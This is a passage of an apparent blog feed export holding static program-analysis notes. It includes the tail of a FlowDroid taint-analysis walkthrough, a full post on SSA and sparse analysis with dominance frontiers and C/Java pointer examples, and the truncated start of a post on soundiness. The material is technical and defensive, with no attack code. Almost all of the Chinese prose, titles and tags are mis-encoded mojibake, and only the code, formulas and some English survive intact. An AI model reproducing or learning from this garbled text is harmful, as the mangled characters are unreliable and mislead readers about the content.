analysis.</span></span><br><span class="line">processEntryPoint(sourcesAndSinks, resultAggregator, -<span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write the results to disk if requested</span></span><br><span class="line">serializeResults(resultAggregator.getAggregatedResults(), resultAggregator.getLastICFG());</span><br><span class="line"></span><br><span class="line"><span class="comment">// We return the aggregated results</span></span><br><span class="line"><span class="keyword">this</span>.infoflow = <span class="keyword">null</span>;</span><br><span class="line">resultAggregator.clearLastResults();</span><br><span class="line"><span class="keyword">return</span> resultAggregator.getAggregatedResults();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="soot-jimple-infoflow-Infoflow-runAnalysis-ISourceSinkManager-Set"><a href="#soot-jimple-infoflow-Infoflow-runAnalysis-ISourceSinkManager-Set" class="headerlink" title="soot.jimple.infoflow.Infoflow#runAnalysis(ISourceSinkManager, Set\)"></a>soot.jimple.infoflow.Infoflow#runAnalysis(ISourceSinkManager, Set\<string\>)</string\></h2><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://blogs.uni-paderborn.de/sse/tools/flowdroid/" target="_blank" rel="noopener">https://blogs.uni-paderborn.de/sse/tools/flowdroid/</a></li><li><a href="https://github.com/secure-software-engineering/FlowDroid" target="_blank" rel="noopener">https://github.com/secure-software-engineering/FlowDroid</a></li><li><a href="https://github.com/soot-oss/soot" target="_blank" rel="noopener">https://github.com/soot-oss/soot</a></li><li><a href="http://sable.github.io/heros/" target="_blank" rel="noopener">http://sable.github.io/heros/</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;å·¥å…·ä»‹ç»&quot;&gt;&lt;a href=&quot;#å·¥å…·ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;å·¥å…·ä»‹ç»&quot;&gt;&lt;/a&gt;å·¥å…·ä»‹ç»&lt;/h1&gt;&lt;p&gt;FlowDroid[1,2] æ˜¯ Arzt ç­‰äººè®¾è®¡çš„ä¸€æ¬¾ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆå¯¹è±¡æ•æ„Ÿï¼‰ï¼Œæµæ•æ„Ÿï¼ŒåŸŸæ•æ„Ÿçš„é™æ€æ±¡ç‚¹åˆ†æå·¥å…·ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¸å…¶ä»–æ±¡ç‚¹åˆ†æå·¥å…·ï¼ˆå¦‚TAJï¼‰ä¸åŒçš„æ˜¯å…¶é’ˆå¯¹å®‰å“åº”ç”¨ï¼Œå¯¹å®‰å“åº”ç”¨çš„ç‰¹æ€§åšäº†å¾ˆå¤šæ”¹è¿›å’Œä¼˜åŒ–ã€‚&lt;/p&gt;&lt;p&gt;è¯¥å·¥å…·åŸºäºSoot[3]å’ŒHeros[4]ï¼Œsootä½œä¸ºç»å…¸çš„Javaè¯­è¨€åˆ†ææ¡†æ¶ï¼Œèƒ½æä¾›SSAå’Œcallgraphï¼ŒHerosæ˜¯ä¸€ä¸ªé€šç”¨çš„IFDS/IDSåˆ†ææ¡†æ¶ï¼Œé€Ÿåº¦æ²¡æœ‰WALAå¿«ï¼Œä½†æ˜¯æ¯”WALAæ›´é€šç”¨ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="Android" scheme="http://anemone.top/tags/Android/"/>
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="FlowDroid" scheme="http://anemone.top/tags/FlowDroid/"/>
    
  </entry>
  
  <entry>
    <title>åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰</title>
    <link href="http://anemone.top/pl-%E5%8C%97%E5%A4%A7%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88SSA%E5%92%8C%E7%A8%80%E7%96%8F%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/</id>
    <published>2020-10-05T13:22:13.000Z</published>
    <updated>2020-10-21T12:25:35.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®æµåˆ†æçš„é—®é¢˜"><a href="#æ•°æ®æµåˆ†æçš„é—®é¢˜" class="headerlink" title="æ•°æ®æµåˆ†æçš„é—®é¢˜"></a>æ•°æ®æµåˆ†æçš„é—®é¢˜</h1><p>å…ˆå‰æœ‰å¾ˆå¤šæ•°æ®æµåˆ†æé—®é¢˜éƒ½æ˜¯å…³äºå˜é‡ä¸­çš„å€¼åˆ†æï¼Œä¾‹å¦‚ï¼šç¬¦å·åˆ†æã€å¸¸é‡ä¼ æ’­ã€æ±¡ç‚¹åˆ†æç­‰ã€‚è€ƒè™‘å¯¹ä»¥ä¸‹CFGåšæ•°å€¼åˆ†æï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201002210707678.png" alt="image-20201002210707678" style="width:50%;"></p><ul><li>åœ¨ç©ºé—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦ä¿å­˜ä¸€ä»½å…³äºx, y, zçš„å€¼ï¼Œè€Œä¸€ä¸ªèŠ‚ç‚¹é€šå¸¸åªå½±å“äº†å°‘æ•°å˜é‡ï¼ˆå¦‚èŠ‚ç‚¹2ä¸y,z æ— å…³ï¼‰</li><li>åœ¨æ—¶é—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹å½“èŠ‚ç‚¹ä¸€æ›´æ–°yæ—¶ï¼Œæ›´æ–°è‡³äºèŠ‚ç‚¹3æœ‰å…³ï¼Œä½†æ˜¯æ•°æ®æµå¿…é¡»é€šè¿‡2æ‰èƒ½ä¼ åˆ°3</li></ul><a id="more"></a><h1 id="åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ"><a href="#åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ" class="headerlink" title="åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ"></a>åŸºäºDef-Useçš„æ•°æ®æµåˆ†æ</h1><h2 id="Def-Useå…³ç³»"><a href="#Def-Useå…³ç³»" class="headerlink" title="Def-Useå…³ç³»"></a>Def-Useå…³ç³»</h2><blockquote><p>ç»™å®šå˜é‡xï¼Œå¦‚æœç»“ç‚¹Aå¯èƒ½æ”¹å˜xçš„å€¼ï¼Œç»“ç‚¹Bå¯èƒ½ä½¿ç”¨ç»“ç‚¹Aæ”¹å˜åçš„xçš„å€¼ï¼Œåˆ™ç»“ç‚¹Aå’Œç»“ç‚¹Bå­˜åœ¨Def-Useå…³ç³»</p></blockquote><p>ä»¥ä¸Šé¢çš„CFGæ¥è¯´ï¼ŒèŠ‚ç‚¹0å’ŒèŠ‚ç‚¹1ï¼ŒèŠ‚ç‚¹1å’ŒèŠ‚ç‚¹3å°±å­˜åœ¨Def-Useå…³ç³»ã€‚</p><p>åŸºäºDef-Useçš„æ•°æ®æµåˆ†æé¦–å…ˆå°†å…¶è½¬æ¢ä¸ºDef-Useè¾¹çš„å›¾ï¼Œå†æ ¹æ®DefUseè¾¹åšæ•°æ®æµåˆ†æï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201002211638949.png" alt="image-20201002211638949"></p><p>ä¾‹å¦‚ä¸Šå›¾ï¼Œæœ‰ä»¥ä¸‹è½¬æ¢å‡½æ•°ï¼š</p><ul><li>$y_0=f_0()$</li><li>$y_1=f_1(y_0\sqcap y_1)$</li><li>$x_2=f_2(x_2\sqcap x_0)$</li><li>$z_3=f_3(y_0\sqcap y_1)$</li></ul><p>å¯¹Def-Useçš„æ•°æ®æµåˆ†ææœ‰ä»¥ä¸‹å¥½å¤„ï¼š</p><ul><li>èŠ‚ç‚¹åªéœ€ä¿å­˜ä¸è‡ªå·±ç›¸å…³çš„æŠ½è±¡å€¼</li><li>å›¾ä¸Šçš„è¾¹å¤§å¤§å‡å°‘ï¼Œå³å›¾å˜ä¸ºç¨€ç–å›¾</li><li>åˆ†ææ•ˆç‡æé«˜</li></ul><h2 id="ç›¸å…³æ€§è´¨"><a href="#ç›¸å…³æ€§è´¨" class="headerlink" title="ç›¸å…³æ€§è´¨"></a>ç›¸å…³æ€§è´¨</h2><ul><li>mayåˆ†æï¼Œè¿”å›ç»“æœæ˜¯çœŸå®ç»“æœçš„è¶…é›†ï¼›</li><li>soundnesså’Œprecisionï¼Œç­‰æ•ˆäºåŸæ•°æ®æµåˆ†ææ•ˆæœã€‚</li></ul><h2 id="éœ€è¦è§£å†³çš„é—®é¢˜"><a href="#éœ€è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="éœ€è¦è§£å†³çš„é—®é¢˜"></a>éœ€è¦è§£å†³çš„é—®é¢˜</h2><p>é—®é¢˜1ï¼šå¦‚ä½•æ„é€ Def-Useï¼Ÿ</p><p>å¯ä»¥ç”¨Reaching Definitionåˆ†æå¾—åˆ°ï¼Œé‚£ä¹ˆåˆ†æå¤æ‚åº¦ä¸º $O(nm^2)$ï¼Œnä¸ºæ§åˆ¶æµå›¾èŠ‚ç‚¹ï¼Œmä¸ºèµ‹å€¼è¯­å¥ä¸ªæ•°ï¼Œé€Ÿåº¦ä¸å¤Ÿå¿«ã€‚</p><p>é—®é¢˜2ï¼šå¦‚æœåˆ†æ”¯è¯­å¥è¿‡å¤šï¼ŒDef-Useçš„è¾¹åè€Œä¼šå¢åŠ ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003114329338.png" alt="image-20201003114329338"></p><h1 id="é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ"><a href="#é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ" class="headerlink" title="é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ"></a>é™æ€å•èµ‹å€¼å’Œç¨€ç–åˆ†æ</h1><h2 id="é™æ€å•èµ‹å€¼"><a href="#é™æ€å•èµ‹å€¼" class="headerlink" title="é™æ€å•èµ‹å€¼"></a>é™æ€å•èµ‹å€¼</h2><p>ä¸ºè§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå¼•å…¥é™æ€å•èµ‹å€¼ï¼ˆSSAï¼‰ï¼Œåœ¨SSAä¸­ï¼Œæ¯ä¸ªå˜é‡åªè¢«èµ‹å€¼ä¸€æ¬¡ï¼Œå¹¶ä¸”å¼•å…¥$\phi()$å‡½æ•°è¡¨ç¤ºæ§åˆ¶æµæ±‡èšçš„æƒ…å†µï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼ˆå·¦ä¾§ï¼‰è¡¨ç¤ºä¸ºé™æ€å•èµ‹å€¼å½¢å¼ï¼ˆå³ä¾§ï¼‰ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003114951916.png" alt="image-20201003114951916" style="width:80%;"></p><p>SSAæœ‰å¦‚ä¸‹å‡ ä¸ªå¥½å¤„ï¼š</p><ul><li><p>SSAç›´æ¥æä¾›äº†def-useé“¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç­‰å·å·¦è¾¹å˜é‡ä¸ºå…¥åº¦ï¼Œç­‰å·å³è¾¹å˜é‡ä¸ºå‡ºåº¦ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003115232485.png" alt="image-20201003115232485" style="width:80%;"></p></li><li><p>SSAçš„è¾¹ä¸ä¼šå¹³æ–¹å¢é•¿ï¼ˆå› ä¸ºæœ‰$\phi()$ï¼‰ï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003115325736.png" alt="image-20201003115325736"></p></li><li><p>SSAä¸Šçš„æµéæ•æ„Ÿåˆ†æå’Œæµæ•æ„Ÿåˆ†æç­‰ä»·ï¼ˆå˜é‡é—´èµ‹å€¼å…³ç³»åæ˜ äº†æ•°æ®æµå‘ï¼‰</p></li></ul><h2 id="ç¨€ç–åˆ†æ"><a href="#ç¨€ç–åˆ†æ" class="headerlink" title="ç¨€ç–åˆ†æ"></a>ç¨€ç–åˆ†æ</h2><p>åŸºäºSSAçš„åˆ†æè¢«ç§°ä¸º<strong>ç¨€ç–åˆ†æ</strong>ï¼ˆsparse program analysisï¼‰</p><h1 id="æ„é€ SSA"><a href="#æ„é€ SSA" class="headerlink" title="æ„é€ SSA"></a>æ„é€ SSA</h1><p>é¦–å…ˆè®¨è®º$\phi$çš„åŠ å…¥æ¡ä»¶ï¼Œå¯¹äºä¸€ä¸ªä»£ç å—Bï¼Œè‹¥æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼Œéœ€è¦åœ¨Bå‰åŠ $\phi$ï¼š</p><ol><li><p>åˆ°è¾¾Bçš„è·¯å¾„â‰¥2ï¼›</p></li><li><p>å…¶ä¸­æœ‰ä¸€æ¡è·¯å¾„ç»è¿‡äº†æŸå˜é‡içš„èµ‹å€¼è¯­å¥sï¼›</p></li><li><p>æœ‰ä¸€æ¡è·¯å¾„æ²¡æœ‰ç»è¿‡sï¼›</p></li><li><p>så’ŒBä¹‹é—´æ²¡æœ‰åˆ«çš„ä»£ç å—æ»¡è¶³æ¡ä»¶ã€‚</p></li></ol><h2 id="æ”¯é…å…³ç³»"><a href="#æ”¯é…å…³ç³»" class="headerlink" title="æ”¯é…å…³ç³»"></a>æ”¯é…å…³ç³»</h2><p><strong>èŠ‚ç‚¹Aæ”¯é…ï¼ˆdominateï¼‰èŠ‚ç‚¹B</strong>ï¼ŒæŒ‡æ‰€æœ‰ä»Entryåˆ°Bçš„è·¯å¾„éƒ½è¦ç»è¿‡Aï¼Œå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼ŒAéƒ½æ”¯é…Bï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003162723477.png" alt="image-20201003162723477"></p><p><strong>ç»“ç‚¹Aä¸¥æ ¼æ”¯é…ï¼ˆStrictly dominateï¼‰ç»“ç‚¹B</strong>ï¼ŒAæ”¯é…Bå¹¶ä¸”Aå’ŒBä¸æ˜¯ä¸€ä¸ªç»“ç‚¹ï¼ˆå¦‚ä¸Šå›¾ä¸­ï¼Œåªæœ‰å·¦å›¾Aä¸¥æ ¼æ”¯é…Bï¼‰ã€‚</p><p><strong>ç»“ç‚¹Açš„æ”¯é…è¾¹ç•Œï¼ˆDominance Frontierï¼‰ä¸­åŒ…æ‹¬B</strong>ï¼Œå½“ä¸”ä»…å½“ï¼š</p><ul><li><p>Aæ”¯é…Bçš„æŸä¸€ä¸ªå‰é©±ç»“ç‚¹ï¼Œå³Aåœ¨Bçš„æŸæ¡è·¯å¾„ä¸Šï¼š</p>  <pre class="mermaid">    graph TB      a((A)) --> c((C))      a --> e(( ))      e --> c      c --> b((B))      f(( )) --> b</pre></li><li><p>æˆ–è€…ï¼ŒAä¸ä¸¥æ ¼æ”¯é…Bï¼Œå³A==Bï¼š</p>  <pre class="mermaid">    graph TB      a((A==B)) --> e(( ))      e -->a</pre><p>  å¯¹äºä»»æ„èµ‹å€¼è¯­å¥<code>x=...</code>æ‰€åœ¨çš„èŠ‚ç‚¹Aï¼Œåœ¨Açš„æ‰€æœ‰æ”¯é…è¾¹ç•Œæ’å…¥$\phi$ã€‚</p></li></ul><p>å¯¹ä»»æ„å˜é‡iï¼Œä»¤ A ä¸ºæ‰€æœ‰å¯¹ i èµ‹å€¼çš„èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ $a \in A$ï¼Œ$DF(a)$ä¸º a çš„æ”¯é…è¾¹ç•Œé›†åˆï¼Œ$DF^+(A)$ ä¸ºæ‰€æœ‰éœ€è¦æ’å…¥ $\phi(i)$ çš„èŠ‚ç‚¹ï¼š</p><ul><li>$\mathrm{DF}(\mathrm{A})=\mathrm{U}_{\{\mathrm{a} \in \mathrm{A}\}} \mathrm{DF}(\mathrm{a})$</li><li>$\mathrm{DF}^{+}(\mathrm{A})=\lim _{i \rightarrow \infty} D F^{i}(A)$<ul><li>$DF^{1}(A)=DF(A)$</li><li>$DF^{i+1}(A)=D F\left(\cup_{j \leq i} DF^{j}(A)\right)$</li></ul></li></ul><h2 id="è®¡ç®—æ”¯é…è¾¹ç•Œ"><a href="#è®¡ç®—æ”¯é…è¾¹ç•Œ" class="headerlink" title="è®¡ç®—æ”¯é…è¾¹ç•Œ"></a>è®¡ç®—æ”¯é…è¾¹ç•Œ</h2><p>è®¡ç®—ç›´æ¥æ”¯é…è€…ï¼ˆimmediate dominatorï¼‰ï¼šaä¸¥æ ¼æ”¯é…bï¼Œå¹¶ä¸”ä¸å­˜åœ¨cï¼Œaä¸¥æ ¼æ”¯é…cä¸”cä¸¥æ ¼æ”¯é…bï¼Œ åˆ™aæ˜¯bçš„ç›´æ¥æ”¯é…è€…ï¼Œè®°ä¸ºidom(b) </p><p>ç›´æ¥æ”¯é…å…³ç³»å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ ‘ï¼Œå³æ”¯é…æ ‘ï¼Œæ”¯é…æ ‘å¯ä»¥åæ˜ æ”¯é…è¾¹ç•Œï¼š</p><p><img src="/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201003170259206.png" alt="image-20201003170259206"></p><p>è®¡ç®—æ”¯é…æ ‘çš„ç®—æ³•æœ‰ä¸¤ç§ï¼š</p><ul><li>Lengauer and Tarjanç®—æ³•<ul><li>å¤æ‚åº¦ä¸º$O(E\alpha(E,N))$</li><li>Eä¸ºè¾¹æ•°ï¼ŒNä¸ºç»“ç‚¹æ•°ï¼Œğ›¼ä¸ºAckermanå‡½æ•°çš„é€†ï¼ˆAckermanå‡½æ•°åŸºæœ¬å¯ä»¥è®¤ä¸ºæ˜¯å¸¸æ•°ï¼‰</li></ul></li><li>Cooper, Harvey, Kennedyç®—æ³•<ul><li>å¤æ‚åº¦ä¸º $O(N^2)$ï¼Œå®é™…æ¯” Lengauer and Tarjan å¿«</li></ul></li></ul><h1 id="é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•"><a href="#é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•" class="headerlink" title="é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•"></a>é™æ€å•èµ‹å€¼çš„é™åˆ¶å’Œå®é™…åšæ³•</h1><p> SSAéœ€è¦æ¯ä¸ªå†…å­˜ä½ç½®ä¸€æ—¦èµ‹å€¼ï¼Œå…¶å€¼éƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä½†æ˜¯åœ¨æŒ‡é’ˆæ“ä½œæ—¶å¹¶ä¸æ»¡è¶³ï¼Œä¾‹å¦‚ä¸‹é¢Cä»£ç çš„æŒ‡é’ˆæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">10</span>;</span><br><span class="line">i=&amp;a;</span><br><span class="line">*i=<span class="number">20</span>;</span><br><span class="line">b=a; <span class="comment">// b=?</span></span><br><span class="line"><span class="comment">/* to SSA */</span></span><br><span class="line">a=<span class="number">10</span>;</span><br><span class="line">i=&amp;a;</span><br><span class="line">*i=<span class="number">20</span>;</span><br><span class="line">b=a; <span class="comment">// b=10</span></span><br></pre></td></tr></table></figure><p>å°†å…¶ç¿»è¯‘æˆSSAä¹‹åï¼Œå¯ä»¥çœ‹åˆ°bå€¼å®é™…ä¸Šè¢«å˜é‡ $i$ å½±å“ï¼Œä½†æ˜¯SSAæ²¡æ³•ååº”è¿™ä¸ªä¿¡æ¯ï¼Œå› æ­¤åˆ†æä¸‹æ¥ $b=10$ ï¼Œè¿™ç§æƒ…å†µåœ¨javaä¹Ÿå­˜åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a.f=<span class="number">10</span>;</span><br><span class="line">y=a;</span><br><span class="line">y.f=<span class="number">20</span>;</span><br><span class="line">b=a.f; <span class="comment">// b=?</span></span><br><span class="line"><span class="comment">/* to SSA */</span></span><br><span class="line">a.f=<span class="number">10</span>;</span><br><span class="line">y=a;</span><br><span class="line">y.f=<span class="number">20</span>;</span><br><span class="line">b=a.f; <span class="comment">// b=10</span></span><br></pre></td></tr></table></figure><p>å› æ­¤åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œä¼šåšéƒ¨åˆ†SSAï¼Œåªå¯¹èƒ½è½¬æ¢çš„ç»„åšä¼˜åŒ–ã€‚</p><p>å¯¹äºJavaæ¥è¯´ï¼Œæ ˆä¸Šçš„å˜é‡ä¸ºä¼˜åŒ–ç»„ï¼Œå †ä¸Šçš„å˜é‡ä¸ºä¸ä¼˜åŒ–ç»„ï¼›</p><p>å¯¹äºCçš„æƒ…å†µï¼šå’Œtop-levelï¼ˆä»æ²¡è¢«&amp;å–è¿‡åœ°å€çš„å˜é‡ï¼‰ä¸ºä¼˜åŒ–ç»„ï¼Œaddress-takenï¼ˆæ›¾ç»è¢«&amp;å–è¿‡åœ°å€çš„å˜é‡ ï¼‰ä¸ºä¸ä¼˜åŒ–ç»„ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>è½¯ä»¶åˆ†ææŠ€æœ¯ï¼ŒåŒ—äº¬å¤§å­¦ï¼Œ<a href="https://xiongyingfei.github.io/SA/2019/05_static_single_assignment.pdf" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2019/05_static_single_assignment.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ•°æ®æµåˆ†æçš„é—®é¢˜&quot;&gt;&lt;a href=&quot;#æ•°æ®æµåˆ†æçš„é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;æ•°æ®æµåˆ†æçš„é—®é¢˜&quot;&gt;&lt;/a&gt;æ•°æ®æµåˆ†æçš„é—®é¢˜&lt;/h1&gt;&lt;p&gt;å…ˆå‰æœ‰å¾ˆå¤šæ•°æ®æµåˆ†æé—®é¢˜éƒ½æ˜¯å…³äºå˜é‡ä¸­çš„å€¼åˆ†æï¼Œä¾‹å¦‚ï¼šç¬¦å·åˆ†æã€å¸¸é‡ä¼ æ’­ã€æ±¡ç‚¹åˆ†æç­‰ã€‚è€ƒè™‘å¯¹ä»¥ä¸‹CFGåšæ•°å€¼åˆ†æï¼š&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/pl-åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰/image-20201002210707678.png&quot; alt=&quot;image-20201002210707678&quot; style=&quot;width:50%;&quot;&gt;&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;åœ¨ç©ºé—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦ä¿å­˜ä¸€ä»½å…³äºx, y, zçš„å€¼ï¼Œè€Œä¸€ä¸ªèŠ‚ç‚¹é€šå¸¸åªå½±å“äº†å°‘æ•°å˜é‡ï¼ˆå¦‚èŠ‚ç‚¹2ä¸y,z æ— å…³ï¼‰&lt;/li&gt;
&lt;li&gt;åœ¨æ—¶é—´å¤æ‚åº¦æ–¹é¢ï¼Œå¯¹å½“èŠ‚ç‚¹ä¸€æ›´æ–°yæ—¶ï¼Œæ›´æ–°è‡³äºèŠ‚ç‚¹3æœ‰å…³ï¼Œä½†æ˜¯æ•°æ®æµå¿…é¡»é€šè¿‡2æ‰èƒ½ä¼ åˆ°3&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Soundiness%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆSoundinessï¼‰/</id>
    <published>2020-09-15T13:19:13.000Z</published>
    <updated>2020-09-15T13:19:28.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Soundiness"><a href="#Soundiness" class="headerlink" title="Soundiness"></a>Soundiness</h1><p>Soundinessæ˜¯äº”å¹´å‰çš„æ¦‚å¿µï¼Œå­¦è€…ä»¬å‘ç°ç¨‹åºåˆ†æç”¨äºå®é™…çš„ç°ä»£è¯­è¨€ä¸­ä»å­˜åœ¨å„ç§é—®é¢˜ï¼Œè¿™äº›é—®é¢˜æ˜¯éš¾ä»¥åˆ†æçš„è¯­è¨€ç‰¹æ€§å¯¼è‡´çš„ï¼Œå› æ­¤æå‡ºSoundinessï¼Œè¯´æ˜å¦‚ä½•å¤„ç†è¿™äº›éš¾è§£çš„é—®é¢˜ã€‚</p><h2 id="Hard-features"><a href="#Hard-features" class="headerlink" title="Hard features"></a>Hard features</h2><blockquote><p>Hard-to-analyze features: an aggressively conservative treatment to these features will likely make the analysis too imprecise to scale,rendering the analysis useless.</p></blockquote><a id="more"></a><p>ä¾‹å¦‚ï¼š</p><ul><li>Java<ul><li>Reflectionï¼Œnative codeï¼Œdynamic class loadingï¼Œâ€¦</li></ul></li><li>JavaScript<ul><li>evalï¼ŒDOMï¼ˆdocument object modelï¼‰ï¼Œâ€¦</li></ul></li><li>C/C++<ul><li>æŒ‡é’ˆæ“ä½œï¼Œå‡½æ•°æŒ‡é’ˆï¼Œâ€¦</li></ul></li></ul><p>å› ä¸ºè¿™äº›åŸå› ï¼Œå®é™…ä¸Šï¼š</p><ul><li><p>å­¦æœ¯ç•Œæ‰€æœ‰æŠ€æœ¯åº”ç”¨äºå®é™…è¯­è¨€æ—¶éƒ½æœ‰unsoundçš„æƒ…å†µï¼›</p></li><li><p>å·¥ä¸šç•Œæ‰€æœ‰æ‰«æå™¨éƒ½å¿…é¡»æ¥å—unsoundçš„ç»“æœã€‚</p></li></ul><p>è¿™é€ æˆå¦‚ä¸‹ç»“æœï¼š</p><ul><li>å¤§å¤šæ•°å­¦æœ¯å·¥ä½œå®£ç§°soundï¼Œä½†æ˜¯ç”±äºè¿™äº›ç‰¹æ€§å®é™…ä¸æ˜¯soundçš„ï¼›</li><li>å¤§éƒ¨åˆ†å·¥ä½œä¸è¯´å¦‚ä½•å¤„ç†hardï¼Œæˆ–è€…åœ¨å®ç°ç« èŠ‚ç­‰ä¸èµ·çœ¼çš„éƒ¨åˆ†ç®€å•ä»‹ç»ï¼ˆoff-hand mannerï¼‰ï¼›</li><li>è¿™äº›hardåˆ†æä¼šå¯¹åˆ†æç»“æœé€ æˆå·¨å¤§å½±å“ï¼Œå¦‚javaåå°„ï¼›</li></ul><ul><li>å¯¹äºéä¸“å®¶çš„è¯»è€…ï¼Œä»–ä»¬è¯¯ä»¥ä¸ºåˆ«äººè®ºæ–‡éƒ½æ˜¯soundçš„ï¼›</li><li>å¯¹ä¸“å®¶ï¼Œç”±äºä¸äº†è§£ hard features å¦‚ä½•å¤„ç†ï¼Œå¾ˆéš¾åˆ¤æ–­åˆ†æç²¾åº¦ã€‚</li></ul><h2 id="Soundiness-1"><a href="#Soundiness-1" class="headerlink" title="Soundiness"></a>Soundiness</h2><p>æœ€ç»ˆï¼Œåœ¨2015å¹´ï¼Œåä½PLçš„é¡¶çº§ä¸“å®¶è”åˆå®£è¨€[1]ï¼Œå‘¼åå­¦è€…ä»¬åœ¨ä»Šåè®ºæ–‡é‡Œæ˜ç¡®è¯´æ˜å¯¹hard 